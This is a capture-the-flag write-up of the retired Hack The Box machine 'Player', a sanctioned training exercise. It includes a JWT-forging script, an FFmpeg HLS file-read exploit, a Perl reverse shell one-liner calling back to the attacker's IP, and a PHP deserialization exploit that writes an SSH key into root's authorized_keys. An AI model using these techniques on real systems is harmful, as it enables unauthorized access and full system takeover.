---
layout: post
title: "Player: Hack The Box Walkthrough"
date: 2020-01-18 17:07:55 +0000
last_modified_at: 2020-01-18 17:07:55 +0000
category: Walkthrough
tags: ["Hack The Box", Player, retired]
comments: true
image:
  feature: player-htb-walkthrough.jpg
  credit: TBIT / Pixabay
  creditlink: https://pixabay.com/photos/plant-music-play-break-cd-player-949111/
---

This post documents the complete walkthrough of Player, a retired vulnerable [VM][1] created by [MrR3boot][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Player is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.145 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-07 08:31:08 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 6686/tcp on 10.10.10.145
Discovered open port 80/tcp on 10.10.10.145                                    
Discovered open port 22/tcp on 10.10.10.145
```

`masscan` finds three open ports. `6686/tcp` looks interesting. Let's do one better with nmap scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,6686 -A --reason -oN nmap.txt 10.10.10.145
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.7
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
6686/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2 (protocol 2.0)
```

Hmm. Two SSH services on two different ports.

### Directory/File Enumeration

Let's fuzz for common directories, if any, with `wfuzz`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc 404 http://10.10.10.145/FUZZ
********************************************************
* Wfuzz 2.2.1 - The Web Fuzzer                         *
********************************************************

Target: HTTP://10.10.10.145/FUZZ
Total requests: 4594

==================================================================
ID      Response   Lines      Word         Chars          Request    
==================================================================

00010:  C=403     10 L        30 W          283 Ch        ".hta"
00011:  C=403     10 L        30 W          288 Ch        ".htaccess"
00012:  C=403     10 L        30 W          288 Ch        ".htpasswd"
02320:  C=301      9 L        28 W          314 Ch        "launcher"
03598:  C=403     10 L        30 W          292 Ch        "server-status"

Total time: 58.86833
Processed Requests: 4594
Filtered Requests: 4589
Requests/sec.: 78.03855
```

Check out `/launcher`.


{% include image.html image_alt="39d1a890.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/39d1a890.png" %}


### Sneaky Bastards

Inspecting the HTML source, you'll notice a long string.


{% include image.html image_alt="a9290bd0.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/a9290bd0.png" %}


And, somewhere in the JavaScript is another long string.


{% include image.html image_alt="e9c56132.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/e9c56132.png" %}


At first glance, you might have thought they were the same but look closer, one ends with a `c`, the other ends with a `e`. That got me thinking, what if there's more?

```
# wfuzz -w list.txt --hc 404 http://10.10.10.145/launcher/dee8dc8a47256c64630d803a4c40786FUZZ.php
********************************************************
* Wfuzz 2.2.1 - The Web Fuzzer                         *
********************************************************

Target: HTTP://10.10.10.145/launcher/dee8dc8a47256c64630d803a4c40786FUZZ.php
Total requests: 26

==================================================================
ID      Response   Lines      Word         Chars          Request    
==================================================================

00007:  C=200      0 L         0 W            0 Ch        "g"
00003:  C=302      0 L         0 W            0 Ch        "c"
00005:  C=200      0 L         3 W           16 Ch        "e"

Total time: 1.084244
Processed Requests: 26
Filtered Requests: 23
Requests/sec.: 23.97982
```

Sneaky bastards!

The string ending with `c` issues a JWT for access. There's something interesting going on with the payload.


{% include image.html image_alt="655fd5fb.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/655fd5fb.png" %}


Keep this in mind for the time being. Who knows we may need to re-visit this later on?

### More than meets the eye

There isn't much to explore other than the possibility of virtual hosts or subdomains. Judging from past experiences, the name of the machine, appended with `.htb` is the domain name. Let's fuzz it with the most common subdomain wordlist and see what we can find.

```
# wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -H "Host: FUZZ.player.htb" -t 20 --hc '400,403,404' http://10.10.10.145/                          
********************************************************
* Wfuzz 2.2.1 - The Web Fuzzer                         *
********************************************************

Target: HTTP://10.10.10.145/
Total requests: 4997

==================================================================
ID      Response   Lines      Word         Chars          Request
==================================================================

00067:  C=200     63 L       180 W         1470 Ch        "staging"
00070:  C=200    259 L       714 W         9513 Ch        "chat"
00019:  C=200      2 L        14 W           92 Ch        "dev"

Total time: 63.18726
Processed Requests: 4997
Filtered Requests: 4994
Requests/sec.: 79.08238
```

Voila. There you have it. We better put them into `/etc/hosts`. This is how they look like.


#### chat.player.htb


{% include image.html image_alt="c18a8afe.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/c18a8afe.png" %}


Interesting conversation going on there. :wink:

#### dev.player.htb


{% include image.html image_alt="40c7451d.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/40c7451d.png" %}


Codiad in the house!

#### staging.player.htb


{% include image.html image_alt="272db3d7.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/272db3d7.png" %}


As mentioned in the chat above, there are some sensitive files exposed in staging. Let's see if we can uncover them.

```
# curl -i http://staging.player.htb/contact.php
HTTP/1.1 200 OK
Date: Fri, 12 Jul 2019 03:48:43 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
refresh: 0;url=501.php
Vary: Accept-Encoding
Content-Length: 818
Content-Type: text/html

array(3) {
  [0]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(6)
    ["function"]=>
    string(1) "c"
    ["args"]=>
    array(1) {
      [0]=>
      &string(9) "Cleveland"
    }
  }
  [1]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(3)
    ["function"]=>
    string(1) "b"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Glenn"
    }
  }
  [2]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(11)
    ["function"]=>
    string(1) "a"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Peter"
    }
  }
}
Database connection failed.<html><br />Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php
```

Hmm. Two things. What's `/var/www/backup/service_config` and `/var/www/staging/fix.php`? The file `fix.php` results in a 500 error.

```
# curl -i http://staging.player.htb/fix.php
HTTP/1.0 500 Internal Server Error
Date: Fri, 12 Jul 2019 03:51:14 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Content-Length: 0
Connection: close
Content-Type: text/html
```

Something funky sure is going on...

### Orphaned Files

Recall the chat where Vincent mention the main site was exposing source code. It turns out that one of the PHP files had an orphan left behind.


{% include image.html image_alt="23562c63.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/23562c63.png" %}


Armed with the key and the access code, we can now generate the right JWT to access the early release of PlayBuff. I wrote the following `bash` script to generate the JWT.

```bash
#!/bin/bash

ACCESS=0E76658526655756207688271159624026011393
KEY="_S0_R@nd0m_P@ss_"
HEADER="{\"typ\":\"JWT\",\"alg\":\"HS256\"}"
PAYLOAD="{\"project\":\"PlayBuff\",\"access_code\":\"$ACCESS\"}"
JWT=$(echo -n $HEADER | base64 -w0).$(echo -n $PAYLOAD | base64 -w0 | tr '+/' '\-\_' | tr -d '=')
DGST=$(echo -n $JWT | openssl dgst -sha256 -hmac $(echo -n $KEY | tr '\-\_' '+/' | base64 -id 2>/dev/null) | cut -d' ' -f2 | xxd -p -r | base64 | tr '+/' '\-\_' | tr -d '=')

echo ${JWT}.${DGST}
```

We should get the following JWT from running the script.

```
# ./jwt.sh
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE
```

With that, we should be able to access PlayBuff.


{% include image.html image_alt="2fce9df5.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/2fce9df5.png" %}


### FFmpeg HLS SSRF Vulnerability

I was able to make use of this [script](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/gen_avi_bypass.py) to generate a M3U playlist file masqueraded as an AVI file to exploit the FFmpeg HTPP Live Streaming (HLS) vulnerability to read files.

Once the media is "buffed", make sure the file size is not 8.5KB (if it's 8.5KB, the file is not readable for some reason). Then use `ffmpeg` to convert the media to PNG screenshots. Finally, we use `gocr` to convert the images to text.

```
# ffmpeg -i <AVI file> file-%02d.png
```

Check out `/var/www/backup/service_config`.

```
-------------
-- Options --
-------------

options.timeout = 120
options.subscribe = true


--------------
-- Accounts --
--------------

server = IMAP {
   server = 'player.htb',
   username = 'telegen',
   password = 'd-bC|jC!2uepS/w' ,
   ssl = 'tlsv1.3',
}

mailboxes, folders = server:list_all()

for i,m in pairs (mailboxes) do
    messages = server[m]:is_unseen() -- + server[m]:is_new ()
    --subjects = server[m]:fetch_fields({ 'subject' }, messages)
    body = server[m]:fetch_body(messages)
    if body ~= nil then
        print (m)
        for j,s in pairs (body) do
            print (string.format("\t%s", s))
        end
    end
end
```

For some reason, I was unable to read `/var/www/staging/fix.php`. Well, screw that. I got credentials yo~


## Low-Privilege Shell

Armed with (`telegen:d-bC|jC!2uepS/w`), let's see if we can log it to one of the SSHs.


{% include image.html image_alt="433c86b8.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/433c86b8.png" %}


Holy cow. It works! Too bad the euphoria didn't last long because I'm facing `lshell`. This configuration is extremely restrictive. All commands are forbidden.


{% include image.html image_alt="c38c40ec.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/c38c40ec.png" %}


See? Nothing is allowed.

### OpenSSH 7.2p1 - (Authenticated) xauth Command Injection

This vulnerability almost got me. Notice that `6686/tcp` is running OpenSSH 7.2? The prerequisite for the only exploit (EDB-ID [39569](https://www.exploit-db.com/exploits/39569)) I could find, is `X11Forwarding` has to be enabled. There's no way for me to confirm that without actually trying the exploit. So, let's do this.


{% include image.html image_alt="4425c449.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/4425c449.png" %}


Damn.

The file `user.txt` is at `telegen`'s home directory.


{% include image.html image_alt="e0340acb.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/e0340acb.png" %}


This time round we can also read `/var/www/staging/fix.php`.


{% include image.html image_alt="87d6066f.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/87d6066f.png" %}


If you are wondering where does this credential (`peter:CQXpm\z)G5D#%S$y=`) belong to, the answer is Codiad (or `dev.player.htb`). Early on, I managed to take a peek at `/var/www/demo/data/users.php`. This is how it looks like.


{% include image.html image_alt="3a88751f.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/3a88751f.png" %}


Notice it's commented out? I almost fell for the password-cracking rabbit hole.

## Low-Privilege Shell Redux

Now that we have access to Codiad, we can create PHP files. :triumph:


{% include image.html image_alt="1d670c81.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/1d670c81.png" %}


With that, we can finally run a reverse shell back. I'm using a Perl one-liner like so.

```
perl -e 'use Socket;$i="10.10.14.2";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```


{% include image.html image_alt="673b212e.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/673b212e.png" %}


Bam! And from there, we can `su` to `telegen`, bypassing `lshell` entirely.

## Privilege Escalation

During enumeration of `telegen`'s account, and with the help of `pyspy`, I noticed a periodic execution of PHP under `root`'s context.


{% include image.html image_alt="d0b4d23b.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/d0b4d23b.png" %}


Something interesting caught my attention when I'm at the directory `/var/lib/playbuff`. Check out `buff.php`.


{% include image.html image_alt="275c98e3.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/275c98e3.png" %}


We have a PHP serialization vulnerability here! And guess what, `telegen` has write permissions on `merge.log`. In short, we can write data anywhere on the file system as `root`. Let's write a SSH public key we control to `/root/.ssh/authorized_keys`. That should give us access to `root` through SSH.

With that in mind, I wrote a very simple PHP exploit like so.

```php
<?php

class playBuff {
  public $logFile = "../../../../../../../../../../../root/.ssh/authorized_keys";
  public $logData = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDvFUGQQMfyr26mAXPsevYIWPtc/hgF7u4BvvVqsmvlzCWy13/RPJcqy5sC7h717+X4LJlxMan0lv30+cSUJwfeEyvjgQjVkV6FIuGzXZXsQapMsIntrjP0fprtz5vR6qdNAsr+4wqU4ewBfzVmfh+s1+RWWh4xIlJD3EFiCbcNfHAdSuq9Q6aHZyjoWrKcKBc2LmTGH4fozyXzN8WIkgpKoVs5wwDRFlAA6/l7EM9cvkiAlbrLL5ig3zvN1Ag0d/hTBylMZzq5VXDWlwD1hyUvpKc0dV66/6I11jEIHzE6apNU7BUU9OtvsfoYJtrPMKg5+r3m80MSunGa6eZAq9/J";
  public function __wakeup() {
    file_put_contents(__DIR__."/".$this->logFile,$this->logData);
  }
}

echo serialize(new playBuff());

?>
```

Running the exploit on my attacking machine like so, produces a `base64`-encoded serialized string that we can `echo` into `merge.log` while avoiding issues with single/double quotes in `bash`.

```
# php evil.php | base64 -w0 && echo
Tzo4OiJwbGF5QnVmZiI6Mjp7czo3OiJsb2dGaWxlIjtzOjU4OiIuLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzIjtzOjc6ImxvZ0RhdGEiO3M6MzgwOiJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJBUUR2RlVHUVFNZnlyMjZtQVhQc2V2WUlXUHRjL2hnRjd1NEJ2dlZxc212bHpDV3kxMy9SUEpjcXk1c0M3aDcxNytYNExKbHhNYW4wbHYzMCtjU1VKd2ZlRXl2amdRalZrVjZGSXVHelhaWHNRYXBNc0ludHJqUDBmcHJ0ejV2UjZxZE5Bc3IrNHdxVTRld0JmelZtZmgrczErUldXaDR4SWxKRDNFRmlDYmNOZkhBZFN1cTlRNmFIWnlqb1dyS2NLQmMyTG1UR0g0Zm96eVh6TjhXSWtncEtvVnM1d3dEUkZsQUE2L2w3RU05Y3ZraUFsYnJMTDVpZzN6dk4xQWcwZC9oVEJ5bE1aenE1VlhEV2x3RDFoeVV2cEtjMGRWNjYvNkkxMWpFSUh6RTZhcE5VN0JVVTlPdHZzZm9ZSnRyUE1LZzUrcjNtODBNU3VuR2E2ZVpBcTkvSiI7fQ==
```

A minute later, we should be able log in through SSH as `root`.


{% include image.html image_alt="4c1baf4e.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/4c1baf4e.png" %}


:dancer:

## Afterthought

I learned some important lessons: 1) Try harder, and don't give up. 2) Never overlook the information gathering phase.

[1]: https://www.hackthebox.eu/home/machines/profile/196
[2]: https://www.hackthebox.eu/home/users/profile/13531
[3]: https://www.hackthebox.eu/
